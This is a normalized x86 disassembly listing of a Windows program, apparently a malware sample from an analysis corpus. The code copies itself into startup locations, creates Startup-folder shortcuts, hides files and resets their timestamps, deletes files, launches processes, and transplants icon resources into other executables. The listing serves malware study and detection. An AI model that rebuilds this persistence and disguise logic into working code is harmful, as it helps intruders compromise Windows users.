lea edx [ esp + 0x110 ]
and ecx 0x3
[ edi ] [ esi ]
mov edi [ esp + 0x414 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x110 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi ebx
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
lea eax [ esp + 0x10 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call sub_402560
add esp 0x4
lea ecx [ esp + 0x110 ]
lea edx [ esp + 0x10 ]
push 0x0
push ecx
push edx
call [ CopyFileA@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x400
retn
push ebx
lea eax [ esp + 0x214 ]
push rw-data
push eax
call [ sprintf@IAT ]
lea ecx [ esp + 0x21c ]
push ecx
call sub_402660
add esp 0x10
sub_402560
sub esp 0x18
mov eax [ esp + 0x1c ]
push esi
push 0x0
push 0x80
push 0x3
push 0x0
push 0x0
push 0x40000000
push eax
call [ CreateFileA@IAT ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
pop esi
add esp 0x18
retn
lea ecx [ esp + 0xc ]
push ecx
call [ GetSystemTime@IAT ]
lea edx [ esp + 0x4 ]
lea eax [ esp + 0xc ]
push edx
push eax
call [ SystemTimeToFileTime@IAT ]
lea ecx [ esp + 0x4 ]
lea edx [ esp + 0x4 ]
push ecx
lea eax [ esp + 0x8 ]
push edx
push eax
push esi
call [ SetFileTime@IAT ]
push esi
call [ CloseHandle@IAT ]
sub_4025d0
sub esp 0x54
push edi
mov ecx 0x11
xor eax eax
lea edi [ esp + 0x14 ]
[ edi ]
mov [ esp + 0x44 ] ax
lea eax [ esp + 0x4 ]
mov edx [ esp + 0x5c ]
lea ecx [ esp + 0x14 ]
push eax
push ecx
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push edx
push 0x0
mov [ esp + 0x68 ] 0x1
call [ CreateProcessA@IAT ]
pop edi
add esp 0x54
retn
sub_402620
push esi
mov esi [ WaitForSingleObject@IAT ]
push edi
mov edi [ Sleep@IAT ]
mov ecx [ rw-data ]
push ecx
call [ SetEvent@IAT ]
push 0x1
call [ exit@IAT ]
push 0x1
call edi
jmp r-xdata
mov eax [ rw-data ]
push 0x0
push eax
call esi
test eax eax
je r-xdata
sub_402660
push esi
push edi
push rw-data
push rw-data
call [ fopen@IAT ]
mov edx [ esp + 0x14 ]
mov esi eax
mov edi edx
or ecx 0xffffffff
xor eax eax
push esi
[ edi ]
not ecx
dec ecx
push 0x1
push ecx
push edx
call [ fwrite@IAT ]
push esi
call [ fclose@IAT ]
add esp 0x1c
pop edi
pop esi
retn
sub_4026a0
sub esp 0x200
mov al [ rw-data ]
push ebx
push ebp
push esi
push edi
mov [ esp + 0x110 ] al
mov ecx 0x3f
xor eax eax
lea edi [ esp + 0x111 ]
lea edx [ esp + 0x10 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov edi [ esp + 0x214 ]
or ecx 0xffffffff
xor eax eax
push rw-data
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x14 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
mov ebx [ fopen@IAT ]
and ecx 0x3
lea eax [ esp + 0x14 ]
[ edi ] [ esi ]
push eax
call ebx
mov ebp [ fclose@IAT ]
mov esi eax
add esp 0x8
test esi esi
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x110 ]
[ edi ]
not ecx
sub edi ecx
push rw-data
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x14 ]
push ecx
call ebx
lea edx [ esp + 0x118 ]
mov esi eax
push edx
push rw-data
push esi
call [ fprintf@IAT ]
push esi
call ebp
add esp 0x18
lea eax [ esp + 0x10 ]
push eax
call [ GetFileAttributesA@IAT ]
or al 0x6
lea ecx [ esp + 0x10 ]
push eax
push ecx
call [ SetFileAttributesA@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x200
retn
lea ecx [ esp + 0x110 ]
push ecx
push rw-data
push esi
call [ fscanf@IAT ]
push esi
call ebp
mov esi [ atoi@IAT ]
push rw-data
call esi
lea edx [ esp + 0x124 ]
mov edi eax
push edx
call esi
add esp 0x18
cmp eax edi
jle r-xdata
lea eax [ esp + 0x10 ]
push 0x0
push eax
call [ SetFileAttributesA@IAT ]
lea ecx [ esp + 0x10 ]
push ecx
call [ DeleteFileA@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x200
retn
sub_402820
sub esp 0x300
mov dl [ rw-data ]
push ebx
push ebp
push esi
push edi
mov ecx 0x3f
xor eax eax
lea edi [ esp + 0x111 ]
mov [ esp + 0x110 ] dl
mov [ esp + 0x10 ] dl
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0x3f
xor eax eax
lea edi [ esp + 0x11 ]
mov ebx [ esp + 0x314 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov edi ebx
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x110 ]
[ edi ]
not ecx
sub edi ecx
push rw-data
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x114 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
lea eax [ esp + 0x114 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call [ fopen@IAT ]
mov edi [ fscanf@IAT ]
lea ecx [ esp + 0x18 ]
mov esi eax
push ecx
push rw-data
push esi
call edi
lea edx [ esp + 0x24 ]
push edx
push rw-data
push esi
call edi
push esi
call [ fclose@IAT ]
mov edi ebx
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x234 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x234 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x34 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea eax [ esp + 0x234 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call sub_4025d0
add esp 0x28
pop edi
pop esi
pop ebp
pop ebx
add esp 0x300
retn
sub_402970
sub esp 0x104
lea eax [ esp ]
push 0x0
push 0x7
push eax
push 0x0
call [ SHGetSpecialFolderPathA@IAT ]
test eax eax
je r-xdata
add esp 0x104
retn
push ebx
push esi
push edi
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0xc ]
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea edx [ esp + 0xc ]
and ecx 0x3
[ edi ] [ esi ]
mov edi [ esp + 0x114 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea eax [ esp + 0xc ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call [ DeleteFileA@IAT ]
pop edi
pop esi
pop ebx
sub_402a00
sub esp 0x314
lea eax [ esp + 0x8 ]
push 0x0
push 0x7
push eax
push 0x0
call [ SHGetSpecialFolderPathA@IAT ]
test eax eax
je r-xdata
add esp 0x314
retn
push ebx
push esi
push edi
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x14 ]
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea edx [ esp + 0x14 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
mov edi [ esp + 0x328 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea eax [ esp + 0x18 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call [ _access@IAT ]
add esp 0x8
test eax eax
pop edi
pop esi
pop ebx
jne r-xdata
push 0x0
call [ CoInitialize@IAT ]
lea ecx [ esp ]
push ecx
push r--data
push 0x1
push 0x0
push r--data
call [ CoCreateInstance@IAT ]
test eax eax
jl r-xdata
mov eax [ esp + 0x324 ]
test eax eax
je r-xdata
mov eax [ esp ]
mov ecx [ esp + 0x320 ]
push ecx
push eax
mov edx [ eax ]
call [ edx + 0x50 ]
mov eax [ esp ]
mov ecx [ esp + 0x31c ]
push ecx
push eax
mov edx [ eax ]
call [ edx + 0x1c ]
mov eax [ esp ]
lea ecx [ esp + 0x4 ]
push ecx
push r--data
mov edx [ eax ]
push eax
call [ edx ]
test eax eax
jl r-xdata
mov eax [ esp ]
push eax
mov edx [ eax ]
call [ edx + 0x8 ]
lea edx [ esp + 0x10c ]
push 0x104
push edx
lea eax [ esp + 0x10 ]
push 0xffffffff
push eax
push 0x0
push 0x0
call [ MultiByteToWideChar@IAT ]
mov eax [ esp + 0x4 ]
lea edx [ esp + 0x10c ]
push 0x1
push edx
mov ecx [ eax ]
push eax
call [ ecx + 0x18 ]
mov eax [ esp + 0x4 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_402b60
sub esp 0x104
or ecx 0xffffffff
xor eax eax
lea edx [ esp ]
push ebx
push esi
push edi
mov edi [ esp + 0x114 ]
[ edi ]
not ecx
sub edi ecx
push 0x5c
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi [ strchr@IAT ]
lea ecx [ esp + 0x10 ]
push ecx
call edi
add esp 0x8
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
add esp 0x104
retn
mov ebx [ CreateDirectoryA@IAT ]
inc eax
lea edx [ esp + 0xc ]
push 0x0
push edx
call ebx
test esi esi
je r-xdata
mov [ esi ] 0x0
mov [ esi ] 0x5c
lea eax [ esi + 0x1 ]
jmp r-xdata
push 0x5c
push eax
call edi
mov esi eax
add esp 0x8
test esi esi
je r-xdata
sub_402be0
sub esp 0x30c
mov eax rw-data
push ebx
push esi
push edi
mov esi rw-data
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
lea eax [ esp + 0x214 ]
push 0x104
push eax
push 0x0
call [ GetModuleFileNameA@IAT ]
push 0x0
lea ecx [ esp + 0x114 ]
push 0x5
push ecx
push 0x0
call [ SHGetSpecialFolderPathA@IAT ]
test eax eax
je r-xdata
push rw-data
call sub_402970
add esp 0x4
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov bl [ esi + 0x1 ]
mov cl dl
cmp dl bl
jne r-xdata
pop edi
pop esi
pop ebx
add esp 0x30c
retn
lea edi [ esp + 0x110 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0xc ]
[ edi ]
not ecx
sub edi ecx
mov ebx [ esp + 0x320 ]
mov eax ecx
mov esi edi
mov edi edx
push ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
lea edx [ esp + 0x114 ]
and ecx 0x3
[ edi ] [ esi ]
mov edi [ esp + 0x320 ]
lea ecx [ esp + 0x10 ]
push edi
push ecx
push rw-data
push edx
call [ sprintf@IAT ]
add esp 0x14
lea eax [ esp + 0x214 ]
lea ecx [ esp + 0x110 ]
push eax
push ecx
call [ lstrcmpiA@IAT ]
test eax eax
jne r-xdata
test eax eax
je r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
push ebp
lea eax [ esp + 0x114 ]
push 0x1
push eax
push rw-data
push rw-data
call sub_402a00
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x20 ]
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
lea eax [ esp + 0x20 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call sub_402b60
mov edi rw-data
or ecx 0xffffffff
xor eax eax
add esp 0x14
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x10 ]
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
lea edx [ esp + 0x10 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
mov edi ebx
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea eax [ esp + 0x14 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
lea ecx [ esp + 0x220 ]
push ecx
call [ CopyFileA@IAT ]
pop ebp
lea edx [ esp + 0x110 ]
push eax
push edx
push rw-data
push rw-data
call sub_402a00
add esp 0x10
pop edi
pop esi
pop ebx
add esp 0x30c
retn
mov dl [ eax ]
mov bl [ esi ]
mov cl dl
cmp dl bl
jne r-xdata
sub_402dc0
push ecx
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ WriteFile@IAT ]
lea eax [ esp + 0x10 ]
push 0x0
push eax
lea ecx [ esp + 0x10 ]
push 0x2
push ecx
push esi
mov [ esp + 0x1c ] 0x0
call edi
test eax eax
jne r-xdata
cmp [ esp + 0x10 ] 0x2
je r-xdata
pop edi
pop esi
pop ecx
retn
lea edx [ esp + 0x10 ]
push 0x0
push edx
lea eax [ esp + 0x10 ]
push 0x2
push eax
push esi
mov [ esp + 0x1c ] 0x1
call edi
test eax eax
jne r-xdata
pop edi
xor eax eax
pop esi
pop ecx
retn
cmp [ esp + 0x10 ] 0x2
je r-xdata
pop edi
pop esi
pop ecx
retn
mov ecx [ esp + 0x14 ]
lea edx [ esp + 0x10 ]
push 0x0
push edx
lea eax [ esp + 0x10 ]
push 0x2
push eax
push esi
mov [ esp + 0x1c ] ecx
call edi
test eax eax
jne r-xdata
pop edi
xor eax eax
pop esi
pop ecx
retn
mov ecx [ esp + 0x10 ]
xor eax eax
cmp ecx 0x2
pop edi
sete al
pop esi
pop ecx
retn
pop edi
pop esi
pop ecx
retn
sub_402e60
mov ecx [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
mov eax [ ecx ]
shl eax 0x4
add eax 0x6
test edx edx
jbe r-xdata
retn
push esi
add ecx 0x14
mov esi [ ecx ]
add ecx 0x18
add eax esi
dec edx
jne r-xdata
pop esi
sub_402e90
sub esp 0x10
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x28 ]
xor ebp ebp
cmp [ edi ] 0x0
jbe r-xdata
mov eax [ edi ]
xor ebx ebx
test eax eax
jbe r-xdata
lea esi [ edi + 0x18 ]
mov ebx 0x10
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x10
retn
lea esi [ edi + 0x18 ]
mov al 0x1
shl al cl
mov [ esp + 0x12 ] al
mov [ esp + 0x12 ] 0x0
jmp r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x10
retn
mov eax [ esp + 0x28 ]
mov ecx [ esi - 0x4 ]
cmp eax ecx
jne r-xdata
cmp [ esp + 0x28 ] ebx
jne r-xdata
mov ecx [ esi - 0x4 ]
push ebp
push edi
mov [ esp + 0x20 ] ecx
call sub_402e60
mov ecx [ esp + 0x2c ]
add esp 0x8
lea edx [ esp + 0x28 ]
mov [ esp + 0x1c ] eax
push 0x0
push edx
lea eax [ esp + 0x18 ]
push ebx
push eax
push ecx
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov ecx [ esi ]
inc ebx
add esi 0x18
mov [ ecx + 0x14 ] ebp
mov eax [ edi ]
cmp ebx eax
jb r-xdata
mov eax [ edi ]
inc ebp
add esi 0x18
cmp ebp eax
jb r-xdata
mov eax [ esi ]
lea edx [ esp + 0x28 ]
push 0x0
push edx
mov ebp [ eax + 0x14 ]
mov edx [ esp + 0x2c ]
mov [ eax + 0x14 ] 0x0
mov eax [ esi - 0x4 ]
mov ecx [ esi - 0x8 ]
push eax
push ecx
push edx
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov al [ esi - 0x14 ]
mov cl [ esi - 0x10 ]
mov [ esp + 0x10 ] al
mov eax [ esi ]
mov [ esp + 0x11 ] cl
mov [ esp + 0x13 ] 0x0
mov dx [ eax + 0xc ]
mov [ esp + 0x14 ] dx
mov ax [ eax + 0xe ]
mov [ esp + 0x16 ] ax
mov ecx [ esp + 0x16 ]
mov edx [ esp + 0x14 ]
and ecx 0xffff
and edx 0xffff
imul ecx edx
cmp ecx 0x8
jl r-xdata
sub_402fb0
push esi
mov esi [ esp + 0x8 ]
test esi esi
jne r-xdata
mov ecx [ esi + 0xc ]
mov [ esi + 0x14 ] ecx
mov eax [ ecx + 0x4 ]
mov [ esi ] eax
mov eax [ ecx + 0x8 ]
cdq
sub eax edx
xor edx edx
sar eax 0x1
mov [ esi + 0x4 ] eax
mov dx [ ecx + 0xe ]
xor eax eax
mov ax [ ecx + 0xc ]
imul edx eax
mov [ esi + 0x8 ] edx
mov eax 0x1
pop esi
retn
xor eax eax
pop esi
retn
sub_402ff0
sub esp 0x198
push ebx
mov eax [ esp + 0x1a4 ]
push ebp
push esi
push edi
push 0x0
push 0x80
push 0x2
push 0x0
push 0x0
push 0x40000000
push eax
call [ CreateFileA@IAT ]
mov ebx eax
cmp ebx 0xffffffff
mov [ esp + 0x14 ] ebx
jne r-xdata
mov ecx [ esp + 0x1ac ]
push 0x2
push 0x0
push ecx
call [ LoadLibraryExA@IAT ]
mov ebp eax
test ebp ebp
jne r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x198
retn
mov edi [ esp + 0x1b4 ]
mov esi [ FindResourceA@IAT ]
push 0xe
push edi
push ebp
call esi
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x198
retn
push eax
push ebp
call [ LoadResource@IAT ]
test eax eax
jne r-xdata
push edi
call [ atoi@IAT ]
add esp 0x4
and eax 0xffff
push 0xe
push eax
push ebp
call esi
test eax eax
jne r-xdata
push eax
call [ LockResource@IAT ]
test eax eax
mov [ esp + 0x20 ] eax
jne r-xdata
push ebp
call [ FreeLibrary@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x198
retn
push ebp
call [ FreeLibrary@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x198
retn
xor ecx ecx
mov [ esp + 0x18 ] 0x0
mov cx [ eax + 0x4 ]
mov [ esp + 0x24 ] ecx
cmp [ eax + 0x4 ] 0x0
jbe r-xdata
push ebp
call [ FreeLibrary@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x198
retn
push ecx
push ebx
call sub_402dc0
add esp 0x8
test eax eax
jne r-xdata
add eax 0x12
lea ebx [ esp + 0x34 ]
mov [ esp + 0x10 ] eax
jmp r-xdata
lea eax [ esp + 0x24 ]
push eax
push ebx
call sub_402e90
add esp 0x8
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x198
retn
mov eax [ esp + 0x10 ]
xor edx edx
push 0x3
mov dx [ eax ]
push edx
push ebp
call esi
mov esi eax
test esi esi
je r-xdata
mov eax [ esp + 0x24 ]
xor esi esi
test eax eax
jbe r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x198
retn
push esi
push ebp
call [ LoadResource@IAT ]
mov edi eax
test edi edi
je r-xdata
push ebp
call [ FreeLibrary@IAT ]
push ebx
call [ CloseHandle@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x198
retn
mov ebx [ GlobalFree@IAT ]
lea edi [ esp + 0x34 ]
push esi
push ebp
call [ SizeofResource@IAT ]
push eax
push 0x40
mov [ ebx + 0x4 ] eax
call [ GlobalAlloc@IAT ]
test eax eax
mov [ ebx ] eax
je r-xdata
mov eax [ esp + 0x24 ]
inc esi
add edi 0x18
cmp esi eax
jb r-xdata
push eax
call ebx
mov esi [ ebx + 0x4 ]
push edi
call [ LockResource@IAT ]
mov edi [ ebx ]
mov ecx esi
mov esi eax
mov edx ecx
lea eax [ ebx - 0xc ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
push eax
and ecx 0x3
[ edi ] [ esi ]
call sub_402fb0
add esp 0x4
test eax eax
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
mov ebx [ esp + 0x14 ]
mov edx [ esp + 0x20 ]
mov eax [ esp + 0x18 ]
mov edi [ esp + 0x10 ]
xor ecx ecx
mov cx [ edx + 0x4 ]
inc eax
add edi 0xe
add ebx 0x18
cmp eax ecx
mov [ esp + 0x18 ] eax
mov [ esp + 0x10 ] edi
jb r-xdata
mov esi [ FindResourceA@IAT ]
mov ecx [ esp + 0x24 ]
mov ebx [ esp + 0x14 ]
sub_403230
mov edx [ esp + 0x10 ]
cmp [ edx ] 0x0
je r-xdata
push edi
mov edi [ esp + 0x10 ]
test edi 0xffff0000
je r-xdata
mov eax 0x1
retn 0x10
and edi 0xffff
push edi
push rw-data
push edx
call [ sprintf@IAT ]
add esp 0xc
mov eax 0x1
pop edi
retn 0x10
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
push esi
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov eax 0x1
and ecx 0x3
[ edi ] [ esi ]
pop esi
pop edi
retn 0x10
sub_4032a0
sub esp 0x80
push esi
push edi
mov edi [ esp + 0x8c ]
push edi
call [ LoadLibraryA@IAT ]
mov esi eax
test esi esi
je r-xdata
pop edi
pop esi
add esp 0x80
retn
lea eax [ esp + 0x8 ]
mov [ esp + 0x8 ] 0x0
push eax
push sub_403230
push 0xe
push esi
call [ EnumResourceNamesA@IAT ]
mov al [ esp + 0x8 ]
test al al
je r-xdata
push esi
call [ FreeLibrary@IAT ]
mov edx [ esp + 0x90 ]
lea ecx [ esp + 0x8 ]
push ecx
push edx
push edi
call sub_402ff0
add esp 0xc
sub_403310
sub esp 0x10
mov eax [ esp + 0x14 ]
push ebx
push ebp
push esi
push edi
push 0x0
push 0x80
push 0x3
push 0x0
push 0x0
push 0x80000000
push eax
call [ CreateFileA@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x10
retn
push 0x14
call [ malloc@IAT ]
mov ebx eax
add esp 0x4
test ebx ebx
jne r-xdata
mov ebp [ ReadFile@IAT ]
lea ecx [ esp + 0x24 ]
push 0x0
push ecx
push 0x2
push ebx
push edi
call ebp
test eax eax
jne r-xdata
push edi
call [ CloseHandle@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x10
retn
cmp [ esp + 0x24 ] 0x2
jne r-xdata
push edi
call [ CloseHandle@IAT ]
push ebx
call [ free@IAT ]
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
cmp [ ebx ] 0x0
jne r-xdata
lea edx [ esp + 0x24 ]
push 0x0
lea esi [ ebx + 0x2 ]
push edx
push 0x2
push esi
push edi
call ebp
test eax eax
je r-xdata
cmp [ esp + 0x24 ] 0x2
jne r-xdata
cmp [ esi ] 0x1
jne r-xdata
lea eax [ esp + 0x24 ]
push 0x0
lea esi [ ebx + 0x4 ]
push eax
push 0x2
push esi
push edi
call ebp
test eax eax
je r-xdata
cmp [ esp + 0x24 ] 0x2
jne r-xdata
mov ax [ esi ]
test ax ax
je r-xdata
and eax 0xffff
lea ecx [ eax * 8 ]
sub ecx eax
lea edx [ ecx + ecx + 0x6 ]
push edx
push ebx
call [ realloc@IAT ]
mov esi eax
add esp 0x8
test esi esi
je r-xdata
xor eax eax
mov ax [ esi + 0x4 ]
shl eax 0x4
push eax
call [ malloc@IAT ]
mov ebx eax
add esp 0x4
test ebx ebx
mov [ esp + 0x10 ] ebx
jne r-xdata
xor edx edx
lea ecx [ esp + 0x24 ]
mov dx [ esi + 0x4 ]
push 0x0
shl edx 0x4
push ecx
push edx
push ebx
push edi
call ebp
test eax eax
je r-xdata
push edi
call [ CloseHandle@IAT ]
push esi
call [ free@IAT ]
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
push edi
call [ CloseHandle@IAT ]
push esi
mov esi [ free@IAT ]
call esi
push ebx
call esi
add esp 0x8
mov edx [ esp + 0x24 ]
xor eax eax
mov ax [ esi + 0x4 ]
mov ecx eax
shl ecx 0x4
cmp edx ecx
jne r-xdata
xor ebp ebp
test eax eax
jle r-xdata
mov ebp [ esp + 0x28 ]
push 0x0
push ebp
call [ BeginUpdateResourceA@IAT ]
test eax eax
mov [ esp + 0x18 ] eax
je r-xdata
lea ecx [ ebx + 0x2 ]
lea eax [ esi + 0x7 ]
push ebp
call sub_4036d0
push esi
mov ebp eax
call [ _msize@IAT ]
add esp 0x8
and ebp 0xffff
push eax
push esi
push 0x0
push ebp
mov ebp [ esp + 0x28 ]
push 0xe
push ebp
call [ UpdateResourceA@IAT ]
test eax eax
je r-xdata
mov dl [ ecx - 0x2 ]
add ecx 0x10
mov [ eax - 0x1 ] dl
mov dl [ ecx - 0x11 ]
mov [ eax ] dl
mov dl [ ecx - 0x10 ]
mov [ eax + 0x1 ] dl
mov dl [ ecx - 0xf ]
mov [ eax + 0x2 ] dl
mov dx [ ecx - 0xe ]
mov [ eax + 0x3 ] dx
mov dx [ ecx - 0xc ]
mov [ eax + 0x5 ] dx
mov edx [ ecx - 0xa ]
mov [ eax + 0x7 ] edx
lea edx [ ebp + 0x1 ]
mov [ eax + 0xb ] dx
xor edx edx
mov dx [ esi + 0x4 ]
inc ebp
add eax 0xe
cmp ebp edx
jl r-xdata
push 0x0
push ebp
call [ EndUpdateResourceA@IAT ]
test eax eax
jne r-xdata
mov ebx [ free@IAT ]
xor ebp ebp
mov bp [ esi + 0x4 ]
push esi
mov [ esp + 0x20 ] ebp
call ebx
add esp 0x4
mov [ esp + 0x14 ] 0x0
test ebp ebp
jle r-xdata
push edi
call [ CloseHandle@IAT ]
mov ecx [ esp + 0x10 ]
push ecx
call ebx
add esp 0x4
mov eax 0x1
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
mov eax [ esp + 0x10 ]
lea ebp [ eax + 0x8 ]
mov [ esp + 0x18 ] ebp
jmp r-xdata
mov ecx [ ebp ]
push ecx
call [ malloc@IAT ]
mov esi eax
add esp 0x4
test esi esi
je r-xdata
push edi
call [ CloseHandle@IAT ]
mov eax [ esp + 0x10 ]
push eax
call ebx
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
mov edx [ ebp + 0x4 ]
push 0x0
push 0x0
push edx
push edi
call [ SetFilePointer@IAT ]
cmp eax 0xffffffff
je r-xdata
push edi
call [ CloseHandle@IAT ]
push esi
call ebx
mov ecx [ esp + 0x14 ]
push ecx
call ebx
add esp 0x8
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
mov ecx [ ebp ]
lea eax [ esp + 0x24 ]
push 0x0
push eax
push ecx
push esi
push edi
call [ ReadFile@IAT ]
test eax eax
je r-xdata
push edi
call [ CloseHandle@IAT ]
push esi
call ebx
mov edx [ esp + 0x14 ]
push edx
call ebx
add esp 0x8
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
mov edx [ esp + 0x24 ]
mov eax [ ebp ]
cmp edx eax
jne r-xdata
push edi
call [ CloseHandle@IAT ]
push esi
call ebx
mov eax [ esp + 0x14 ]
push eax
call ebx
add esp 0x8
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
mov eax [ esp + 0x28 ]
push 0x0
push eax
call [ BeginUpdateResourceA@IAT ]
mov ebp eax
test ebp ebp
je r-xdata
mov edx [ esp + 0x14 ]
mov ecx [ esp + 0x24 ]
inc edx
push ecx
push esi
and edx 0xffff
push 0x0
push edx
push 0x3
push ebp
call [ UpdateResourceA@IAT ]
test eax eax
je r-xdata
push 0x0
push ebp
call [ EndUpdateResourceA@IAT ]
test eax eax
